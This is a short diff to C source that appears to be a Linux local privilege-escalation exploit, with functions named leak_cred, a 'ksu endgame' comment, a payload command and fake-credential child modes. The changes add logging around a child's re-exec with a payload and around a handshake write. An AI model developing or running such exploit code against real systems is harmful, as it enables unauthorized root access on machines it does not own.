@@ -2115,6 +2115,8 @@ static unsigned long long leak_cred(unsigned char *raw,
                  * explicitly; IC_EXEC_PAYLOAD marks the ksu endgame. */
                 snprintf(pcenv, sizeof(pcenv), "PAYLOAD_CMD=%s",
                          pcg && *pcg ? pcg : "");
+                logf("[leak] child exec pid=%d uid=%d\n", getpid(),
+                     getuid());
                 execve("/proc/self/exe", av, g_exec_payload ? epk : ep);
                 logf("[-] leak child exec failed errno=%d\n", errno);
             }
@@ -2175,9 +2177,17 @@ static int wait_child_main(const char *mode)
     char ch;
     int hello = CHILD_HELLO;
 
+    logf("[wait] entry mode=%s pid=%d\n", mode, getpid());
     pin(g_cpu);
-    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
-        _exit(130);
+    {
+        ssize_t hr;
+
+        errno = 0;
+        hr = write(4, &hello, sizeof(hello));
+        logf("[wait] hello write=%zd errno=%d\n", hr, errno);
+        if (hr != (ssize_t)sizeof(hello))
+            _exit(130);
+    }
     {
         /* Fake-cred modes: the parent cannot observe task->cred through
          * /proc (status reports real_cred), so it peeks at the child's own
